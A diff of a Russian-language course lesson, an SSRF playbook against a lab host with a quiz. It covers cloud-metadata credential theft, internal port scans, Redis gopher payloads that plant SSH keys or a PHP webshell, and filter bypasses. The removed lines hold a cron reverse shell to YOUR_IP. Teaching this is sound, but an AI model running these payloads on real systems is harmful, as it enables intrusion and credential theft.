@@ -15,210 +15,175 @@ estimated_minutes: 38
 summary: "Decision-tree для SSRF: подтвердить → внутренний порт-скан → cloud metadata → внутренние сервисы (redis/memcached/mysql) → gopher → RCE."
 ---
 
-Сервер сходил по вашему URL — значит, он стал вашим прокси во внутреннюю сеть. Вопрос: **что там, за периметром, и как из «сервер сделал GET» получить креды, данные или код.** Этот плейбук — маршрут от подтверждения SSRF к внутреннему скану, метаданным облака, сервисам вроде Redis и, через `gopher://`, к RCE.
+## Задача
 
-## Дерево решения (общая карта)
+На `https://shop.target.local` есть параметр `?url=`: сервер сходил по нашему URL. Значит, он стал **нашим прокси во внутреннюю сеть**. Вопрос: что там, за периметром, и как из «сервер сделал GET» получить креды, данные или код.
+
+Этот плейбук — маршрут от подтверждения SSRF к внутреннему скану, метаданным облака, сервисам вроде Redis и, через `gopher://`, к RCE.
+
+## Данные, с которыми работаем
+
+`GET /fetch?url=...` на `https://shop.target.local`, наш listener на `YOUR_IP`, `interactsh-client` для OOB. Пройдём дерево.
+
+## Дерево решения
 
 ```
 [SSRF: сервер ходит по моему URL]
-   │
-   ├─(1) ПОДТВЕРДИТЬ и понять канал
-   │      ├─ отражённый (вижу тело ответа) ─► полный SSRF
-   │      ├─ blind (нет ответа) ────────────► OOB-детект (interactsh)
-   │      └─ ограниченный (только http/https) ► обходы схем и редиректов
-   │
+   ├─(1) ПОДТВЕРДИТЬ: отражённый / blind / ограниченный
    ├─(2) ВНУТРЕННИЙ ПОРТ-СКАН (127.0.0.1, 10.0.0.0/8, 169.254.169.254)
-   │      └─ открыт порт ──► (3) или (4)
-   │
-   ├─(3) CLOUD METADATA
-   │      ├─ AWS 169.254.169.254/latest/meta-data/iam/...
-   │      ├─ GCP metadata.google.internal/computeMetadata/v1/
-   │      └─ Azure 169.254.169.254/metadata/instance?api-version=...
-   │      └─► креды/токены ──► доступ к облаку
-   │
-   ├─(4) ВНУТРЕННИЕ СЕРВИСЫ
-   │      ├─ Redis 6379 (no-auth) ──► (5) gopher → RCE
-   │      ├─ Memcached 11211
-   │      ├─ Elasticsearch 9200 (открытый дамп)
-   │      ├─ MySQL/Postgres (пароль в конфиге)
-   │      └─ Docker API 2375 / K8s 10250
-   │
-   └─(5) GOPHER → RCE (Redis: запись cron/SSH/webshell, replication)
-          │
-          └─► [код / креды / данные]
+   ├─(3) CLOUD METADATA ──► креды/токены ──► доступ к облаку
+   ├─(4) ВНУТРЕННИЕ СЕРВИСЫ: Redis 6379, Memcached, Elasticsearch, Docker
+   └─(5) GOPHER → RCE (Redis: cron/SSH/webshell) ──► [код / креды / данные]
 ```
 
-## Шаг 1. Подтвердить SSRF и понять канал
+## Шаг 1: подтвердить SSRF и понять канал
 
-Сначала — точно понять, **что именно контролирует сервер**: URL целиком, только хост, только путь. От этого зависят все дальнейшие шаги.
+Сначала пойми, **что именно контролирует сервер**: URL целиком, только хост, только путь.
 
 ```bash
-# Отражённый SSRF: подставляем свой внешний listener и смотрим, придёт ли запрос
-#   (сначала поднимите приёмник: interactsh-client / nc -lvnp 80)
-curl -s --get --data-urlencode 'url=http://YOUR_IP:80/ssrf-test' https://target.tld/fetch
+# отражённый SSRF: подставляем свой listener
+$ python3 -m http.server 80 &
+$ curl -s --get --data-urlencode 'url=http://YOUR_IP/ssrf-test' https://shop.target.local/fetch
+# в логе listener: GET /ssrf-test  -> SSRF есть
 
-# Проверить, возвращается ли тело ответа (полный SSRF) или только статус (blind)
-curl -s --get --data-urlencode 'url=http://127.0.0.1:80/' https://target.tld/fetch | head
-
-# Обход «только http(s)»: редирект с вашего хоста на внутренний
-#   на YOUR_IP поднимаем: python3 -m http.server; кладём редирект на 169.254.169.254
-curl -s --get --data-urlencode 'url=http://YOUR_IP:8000/redirect' https://target.tld/fetch
-
-# Blind: детект через DNS/HTTP OOB
-interactsh-client   # получите ваш <id>.oast.fun
-curl -s --get --data-urlencode 'url=http://<id>.oast.fun/' https://target.tld/fetch
+# возвращается ли тело ответа (полный) или только статус (blind)
+$ curl -s --get --data-urlencode 'url=http://127.0.0.1/' https://shop.target.local/fetch | head -3
+<!DOCTYPE html><html>...            # полный SSRF -> можно читать
 ```
 
-**Условие ветвления:** приходит запрос на ваш listener → SSRF есть. Видите тело внутреннего ответа → «полный» SSRF, можно сканировать и читать. Только задержка/статус → blind, работаем через OOB и timing.
+**Условие ветвления:** приходит запрос на listener → SSRF есть. Видишь тело внутреннего ответа → «полный» SSRF. Только задержка/статус → blind, работаем через OOB.
 
-## Шаг 2. Внутренний порт-скан
+## Шаг 2: внутренний порт-скан
 
-Используйте сервер как сканер: время ответа и сообщения об ошибках говорят, открыт порт или нет.
+Используем сервер как сканер: время ответа и ошибки говорят, открыт порт или нет.
 
 ```bash
-# Быстрый перебор типовых портов (open=быстро/иной ответ, closed=отказ/таймаут)
-for port in 22 80 443 3306 5432 6379 8000 8080 8443 9200 11211 2375 10250; do
-  t=$(curl -s -o /dev/null -w '%{time_total}' --get \
-      --data-urlencode "url=http://127.0.0.1:$port/" https://target.tld/fetch)
-  echo "127.0.0.1:$port -> $t"
-done
-
-# Отдельные сети: внутренние подсети и облачные адреса
-for ip in 10.0.0.1 10.0.0.2 172.16.0.1 192.168.0.1 169.254.169.254; do
-  curl -s -o /dev/null -w "$ip %{http_code} %{time_total}\n" --get \
-    --data-urlencode "url=http://$ip/" https://target.tld/fetch
-done
+$ for port in 22 80 6379 8080 9200 11211 2375; do
+    t=$(curl -s -o /dev/null -w '%{time_total}' --get \
+        --data-urlencode "url=http://127.0.0.1:$port/" https://shop.target.local/fetch)
+    echo "127.0.0.1:$port -> $t"
+  done
+127.0.0.1:6379 -> 0.021      # быстро -> открыт
+127.0.0.1:9200 -> 0.018
+127.0.0.1:2375 -> 0.350      # таймаут -> закрыт/фильтр
 ```
 
-**Условие ветвления:** открыт 6379/11211/9200 → шаг 4 (сервисы). Открыт 80/8080 внутри → ищите админки/API (идите в `web-playbook-auth-bypass`). Доступен `169.254.169.254` → шаг 3 (метаданные). Ничего → blind-путь и обходы схем.
+**Условие ветвления:** открыт 6379/11211/9200 → шаг 4. Открыт 80/8080 внутри → админки/API (auth-плейбук). Доступен `169.254.169.254` → шаг 3.
 
-## Шаг 3. Cloud metadata
-
-Метаданные облака — часто самый быстрый путь к кредам. Синтаксис зависит от провайдера.
+## Шаг 3: cloud metadata
 
 ```bash
 # --- AWS (IMDSv1) ---
-curl -s --get --data-urlencode 'url=http://169.254.169.254/latest/meta-data/' https://target.tld/fetch
-curl -s --get --data-urlencode 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/' https://target.tld/fetch
-#   затем имя роли из предыдущего ответа:
-curl -s --get --data-urlencode 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME' https://target.tld/fetch
-
-# AWS IMDSv2 (нужен PUT с токеном — SSRF обычно не умеет; пробуйте редиректы/схемы)
-#   если приложение умеет только GET, IMDSv2 защищён — ищите другой путь
+$ curl -s --get --data-urlencode 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/' https://shop.target.local/fetch
+ec2-admin-role
+$ curl -s --get --data-urlencode 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-admin-role' https://shop.target.local/fetch
+{"AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"..."}
 
 # --- GCP (нужен заголовок Metadata-Flavor: Google) ---
-curl -s --get --data-urlencode 'url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' \
-  -H 'Metadata-Flavor: Google' https://target.tld/fetch
+$ curl -s --get --data-urlencode 'url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' \
+    -H 'Metadata-Flavor: Google' https://shop.target.local/fetch
 
 # --- Azure ---
-curl -s --get --data-urlencode 'url=http://169.254.169.254/metadata/instance?api-version=2021-02-01' \
-  -H 'Metadata: true' https://target.tld/fetch
+$ curl -s --get --data-urlencode 'url=http://169.254.169.254/metadata/instance?api-version=2021-02-01' \
+    -H 'Metadata: true' https://shop.target.local/fetch
 ```
 
-**Условие ветвления:** получили `AccessKeyId`/`SecretAccessKey`/`Token` или GCP-токен → это креды облака: переходите в `playbook-cloud` / `cloud-security-audit`. Нет доступа → IMDSv2 включён; ищите другой внутренний сервис (шаг 4).
+**Условие ветвления:** получил `AccessKeyId`/`Token` → это креды облака: переходи в `playbook-cloud`. Нет доступа → IMDSv2 включён; ищи другой сервис (шаг 4).
 
-## Шаг 4. Внутренние сервисы
-
-Открытый внутренний сервис без аутентификации — прямой путь к данным и RCE.
+## Шаг 4: внутренние сервисы
 
 ```bash
-# Redis без пароля: INFO и ключи
-curl -s --get --data-urlencode 'url=http://127.0.0.1:6379/' https://target.tld/fetch
-#   через gopher отправляем настоящие команды Redis (CRLF-протокол)
-curl -s --get --data-urlencode 'url=gopher://127.0.0.1:6379/_INFO%0D%0A' https://target.tld/fetch
+# Redis без пароля
+$ curl -s --get --data-urlencode 'url=gopher://127.0.0.1:6379/_INFO%0D%0A' https://shop.target.local/fetch
 
-# Memcached: статистика и ключи
-curl -s --get --data-urlencode 'url=gopher://127.0.0.1:11211/_stats%0D%0A' https://target.tld/fetch
-
-# Elasticsearch: открытый дамп индексов
-curl -s --get --data-urlencode 'url=http://127.0.0.1:9200/_cat/indices?v' https://target.tld/fetch
-curl -s --get --data-urlencode 'url=http://127.0.0.1:9200/_search?size=50' https://target.tld/fetch
+# Elasticsearch: открытый дамп
+$ curl -s --get --data-urlencode 'url=http://127.0.0.1:9200/_cat/indices?v' https://shop.target.local/fetch
 
 # Docker API (часто = root на хосте)
-curl -s --get --data-urlencode 'url=http://127.0.0.1:2375/version' https://target.tld/fetch
-curl -s --get --data-urlencode 'url=http://127.0.0.1:2375/containers/json' https://target.tld/fetch
+$ curl -s --get --data-urlencode 'url=http://127.0.0.1:2375/version' https://shop.target.local/fetch
 ```
 
-**Условие ветвления:** Redis без пароля → шаг 5 (gopher → RCE). Elasticsearch открыт → дамп и поиск секретов/кредов. Docker API доступен → контейнер-эскейп (см. `svc-docker-k8s`). Всё закрыто → возвращайтесь к blind-сканированию и обходам.
+**Условие ветвления:** Redis без пароля → шаг 5. Elasticsearch открыт → дамп и поиск секретов. Docker API доступен → контейнер-эскейп (`svc-docker-k8s`).
 
-## Шаг 5. gopher → RCE (Redis как пример)
+## Шаг 5: gopher → RCE (Redis как пример)
 
-`gopher://` позволяет отправить на внутренний TCP-порт **произвольные байты** — а значит, говорить на языке сервиса. Redis без пароля через запись файлов даёт RCE.
+`gopher://` отправляет на внутренний TCP-порт **произвольные байты** — значит, мы говорим на языке сервиса. Redis без пароля через запись файлов даёт RCE.
 
 ```bash
-# Идея: CONFIG SET dir + dbfilename + SET + BGSAVE = запись файла на диск.
-# Каждую строку Redis-протокола кодируем в gopher (URL-encoded CRLF).
-
-# 5.1 Запись SSH-ключа в authorized_keys (типовой путь к root)
-#   ключ: ssh-keygen -t rsa -f ./id_rsa
-#   Redis-команды (по одной строке), например:
-#     CONFIG SET dir /root/.ssh/
-#     CONFIG SET dbfilename authorized_keys
-#     SET x "\n\nssh-rsa AAAA...== attacker\n\n"
-#     SAVE
-#   каждую команду шлём gopher-ом:
-curl -s --get --data-urlencode \
+# Идея: CONFIG SET dir + dbfilename + SET + SAVE = запись файла.
+# 5.1 SSH-ключ в authorized_keys (путь к root)
+$ curl -s --get --data-urlencode \
   'url=gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/root/.ssh/%0D%0ACONFIG%20SET%20dbfilename%20authorized_keys%0D%0ASET%20x%20%22%5Cn%5Cnssh-rsa%20AAAA...%3D%3D%20a%5Cn%5Cn%22%0D%0ASAVE%0D%0A' \
-  https://target.tld/fetch
-#   затем: ssh -i id_rsa root@target.tld
+  https://shop.target.local/fetch
+$ ssh -i id_rsa root@shop.target.local
 
-# 5.2 Запись cron (если есть права в /var/spool/cron/)
-#   CONFIG SET dir /var/spool/cron/ ; CONFIG SET dbfilename root
-#   SET x "\n* * * * * bash -i >& /dev/tcp/YOUR_IP/4444 0>&1\n" ; SAVE
-
-# 5.3 Webshell (если известен webroot)
+# 5.2 Webshell (если известен webroot)
 #   CONFIG SET dir /var/www/html/ ; CONFIG SET dbfilename shell.php
 #   SET x "<?php system($_GET['c']); ?>" ; SAVE
-
-# 5.4 Replication RCE (без записи файлов): поднять свой rogue-Redis и
-#     заставить цель сделать SLAVEOF на ваш IP, затем загрузить модуль.
-#     Инструмент: https://github.com/n0b0dyCN/redis-rogue-server
 ```
 
-**Условие ветвления:** запись удалась → проверьте доступ (`ssh`, `curl webshell`, обратный шелл). Не удалось (нет прав на каталог/`CONFIG` отключён) → пробуйте другой путь: master-slave replication, `MODULE LOAD`, или запись в `/var/spool/cron`.
+**Условие ветвления:** запись удалась → проверь доступ (`ssh`, `curl webshell`). Не удалась (нет прав/`CONFIG` отключён) → пробуй replication RCE или запись в `/var/spool/cron`.
 
-**Осторожно:** запись в `authorized_keys`/`cron`/webroot меняет состояние системы. Проверяйте, что путь корректен, не перезаписывайте чужие файлы и не запускайте деструктивных команд. `SAVE`/`BGSAVE` в Redis временно блокируют инстанс.
+**Осторожно:** запись в `authorized_keys`/`cron`/webroot меняет состояние системы. Не перезаписывай чужие файлы и не запускай деструктивных команд. `SAVE` временно блокирует Redis.
 
-## Шаг 6. Blind SSRF и OOB
-
-Если ответа не видно, работайте через внешний канал и время.
+## Шаг 6: blind SSRF и OOB
 
 ```bash
-# OOB через interactsh: подтвердить и измерить, куда ходит сервер
-interactsh-client -v          # ваш <id>.oast.fun
-curl -s --get --data-urlencode 'url=http://<id>.oast.fun/probe' https://target.tld/fetch
-#   в логе interactsh видно DNS/HTTP — значит сервер сделал запрос
+$ interactsh-client -v          # твой <id>.oast.fun
+$ curl -s --get --data-urlencode 'url=http://<id>.oast.fun/probe' https://shop.target.local/fetch
+# в логе interactsh видно DNS/HTTP -> сервер сделал запрос
 
-# Blind-скан портов по времени (open-порты отвечают иначе)
-for port in 6379 9200 8080; do
-  curl -s -o /dev/null -w "$port %{time_total}\n" --get \
-    --data-urlencode "url=http://127.0.0.1:$port/" https://target.tld/fetch
-done
-
-# Blind exfil: заставить сервер сходить на внутренний URL, содержащий данные
-#   (например, metadata) — и вынести их через ваш listener через редирект
+# blind-скан портов по времени
+$ for port in 6379 9200 8080; do
+    curl -s -o /dev/null -w "$port %{time_total}\n" --get \
+      --data-urlencode "url=http://127.0.0.1:$port/" https://shop.target.local/fetch
+  done
 ```
 
-**Условие ветвления:** OOB приходит → у вас SSRF-канал; стройте слепую эксфильтрацию. Тишина → проверьте ограничения (whitelist домена, блок приватных диапазонов) и обходы ниже.
+## Полный прогон от начала до конца
+
+1. `?url=http://YOUR_IP/` → запрос пришёл → SSRF подтверждён.
+2. Порт-скан по времени → открыт `6379`.
+3. `169.254.169.254` → креды роли (если облако).
+4. `gopher://127.0.0.1:6379/_INFO` → Redis без пароля.
+5. `CONFIG SET` + `SET` + `SAVE` → webshell/SSH → RCE.
+6. Артефакт: `ssh`-вход или вывод `id` из webshell.
 
 ## Если не сработало — пробуй это
 
-- **Whitelist доменов.** Обход: `http://allowed.com@127.0.0.1/`, `http://127.0.0.1#allowed.com`, DNS-rebinding, `allowed.com.attacker.tld`.
-- **Блок приватных IP.** Обход: десятичный (`http://2130706433/`), восьмеричный, IPv6 (`http://[::1]/`), `http://0/`, `http://0x7f000001/`, `http://①②⑦.0.0.1` (Unicode).
-- **Только http(s).** Редирект с вашего сервера на `gopher://`/`file://`; или `dict://` для простых сервисов.
-- **Ограничение по длине/схеме.** Используйте короткий редирект (301) на длинный payload, `gopher` через промежуточный редирект.
-- **Слепой и без OOB.** Проверяйте по времени открытые порты; сравнивайте ответы приложения на разные внутренние URL.
-- **IMDSv2 (нужен PUT + токен).** SSRF через GET не сработает — ищите SSRF с произвольным методом/телом или другой сервис.
+- **Whitelist доменов.** `http://allowed.com@127.0.0.1/`, `http://127.0.0.1#allowed.com`, DNS-rebinding, `allowed.com.attacker.tld`.
+- **Блок приватных IP.** Десятичный (`http://2130706433/`), восьмеричный, IPv6 (`http://[::1]/`), `http://0/`, `http://0x7f000001/`.
+- **Только http(s).** Редирект с твоего сервера на `gopher://`/`file://`.
+- **Ограничение по длине.** Короткий редирект (301) на длинный payload.
+- **IMDSv2 (нужен PUT + токен).** SSRF через GET не сработает — ищи SSRF с произвольным методом.
 
-## Тупики (dead ends)
+## Тупики
 
-- Слепо гонять `gopher://` в никуда, не подтвердив, что порт открыт и сервис вообще отвечает.
-- Пытаться прочитать AWS metadata на GCP-хосте (другие адреса/заголовки) — сначала определите провайдера.
-- Записывать файлы через Redis без проверки прав/`CONFIG` — молча не сработает; проверьте `INFO server`/ошибку.
-- Перебирать тысячи внутренних IP «на удачу» — узкий список типовых адресов и портов эффективнее.
-- Игнорировать, что SSRF может быть ограничен только редиректом — тогда все внутренние запросы идут с вашего промежуточного сервера.
+- Гонять `gopher://` в никуда, не подтвердив, что порт открыт.
+- Пытаться читать AWS metadata на GCP-хосте — другие адреса/заголовки.
+- Записывать файлы через Redis без проверки прав/`CONFIG` — молча не сработает.
+- Перебирать тысячи внутренних IP «на удачу» — узкий список эффективнее.
+- Игнорировать, что SSRF может быть ограничен редиректом.
+
+## Что мы теперь знаем
+
+- SSRF бывает отражённый (полный), blind и ограниченный.
+- Внутренний порт-скан делается по времени ответа.
+- Метаданные облака (`169.254.169.254`) — быстрый путь к кредам.
+- `gopher://` даёт сырой TCP-обмен → RCE через Redis.
+- Blind-точки подтверждаются OOB-каналом (interactsh).
+
+## На что смотреть дальше
+
+- **IMDSv2.** PUT+токен ломает GET-based SSRF — ищи другой канал.
+- **Ограничения и обходы.** Whitelist обходится `@`/`#`/DNS-rebinding.
+- **Не деструктивно.** Запись через Redis — аккуратно; `SAVE` блокирует инстанс.
+- **Стабилизация.** Полученный SSH/webshell — для пивота; не флуди.
+- **Egress-фильтрация.** Понимание этого плейбука объясняет, почему она критична.
 
 ## Квиз
+
+Проверь себя.
 
 ```quiz
 - question: "Что означает 'полный' SSRF в отличие от blind?"
@@ -262,6 +227,10 @@ done
   answer: 1
   explanation: "Whitelist обходят через @-userinfo, #, DNS-rebinding и поддомены на ваш домен."
 ```
+
+## Куда дальше
+
+Дальше (`web-csp-advanced`) мы уйдём в клиентскую безопасность — Content Security Policy и её обход. А пока главное запомни: SSRF превращает сервер в твой прокси, и цель ветки — не «сервер ответил», а креды, данные или код.
 
 ## Где пригодится
 
